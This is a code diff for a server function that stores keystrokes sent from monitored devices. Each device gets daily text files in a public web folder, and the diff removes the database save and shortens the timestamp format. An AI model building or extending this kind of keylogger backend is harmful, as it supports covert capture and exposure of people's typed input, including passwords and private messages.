@@ -37,23 +37,17 @@ export const addNewKeyLogs = async (data: any) => {
 			};
 		}
 
-		const newKeyLog: KeyLogsModelType = new KeyLogs({
-			deviceId,
-			keyLogsType,
-			keylogs: keylogs,
-			keyevent: event,
-		});
-
-		// Create a username folder if it doesn't exist
+		// Create a device-specific folder if it doesn't exist
 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
 		if (!fs.existsSync(logsDir)) {
 			fs.mkdirSync(logsDir, { recursive: true });
 		}
 
-		// Check if the number of files exceeds the limit (100 files)
+		// Check if the number of files exceeds the limit (2 files in this case)
 		const files = fs
 			.readdirSync(logsDir)
 			.filter((file) => file.endsWith(".txt"));
+
 		if (files.length >= 2) {
 			// Sort the files by creation time (oldest first)
 			const sortedFiles = files
@@ -73,21 +67,18 @@ export const addNewKeyLogs = async (data: any) => {
 		const today = new Date().toISOString().split("T")[0];
 		const filePath = path.join(logsDir, `${today}.txt`);
 
-		// Format the log entry date to DD/MM/YYYY hh:mm:ss
-		const formatDate = (date: Date) => {
-			const day = String(date.getDate()).padStart(2, "0");
-			const month = String(date.getMonth() + 1).padStart(2, "0");
-			const year = date.getFullYear();
+		// Format the log entry to only include time (hh:mm:ss)
+		const formatTime = (date: Date) => {
 			const hours = String(date.getHours()).padStart(2, "0");
 			const minutes = String(date.getMinutes()).padStart(2, "0");
 			const seconds = String(date.getSeconds()).padStart(2, "0");
-			return `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
+			return `${hours}:${minutes}:${seconds}`;
 		};
 
-		const formattedDate = formatDate(new Date());
+		const formattedTime = formatTime(new Date());
 
-		// Prepare the log entry with the formatted date
-		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
+		// Prepare the log entry with the formatted time
+		const logEntry = `${formattedTime} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
 
 		// Append the log entry to the file
 		fs.appendFileSync(filePath, logEntry);
